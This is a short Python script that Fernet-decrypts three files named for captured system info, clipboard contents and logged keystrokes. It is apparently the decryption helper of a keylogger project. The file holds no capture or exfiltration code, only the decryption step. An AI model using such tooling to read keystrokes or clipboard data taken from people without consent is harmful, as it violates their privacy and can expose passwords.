from cryptography.fernet import Fernet

key = "your key (generated from generatekey.py)"

system_info_e = "e_system.txt"
clipboard_info_e = "e_clipboard.txt"
keys_info = "e_key_logged.txt"

encrypted_files = [system_info_e, clipboard_info_e, keys_info]
count = 0

for decrypting_files in encrypted_files:
    with open(encrypted_files[count], "rb") as f:
        data = f.read()
        
    fernet = Fernet(key)
    decrypted = fernet.decrypt(data)

    with open(encrypted_files[count], "wb") as f:
        f.write(decrypted)
    count += 1
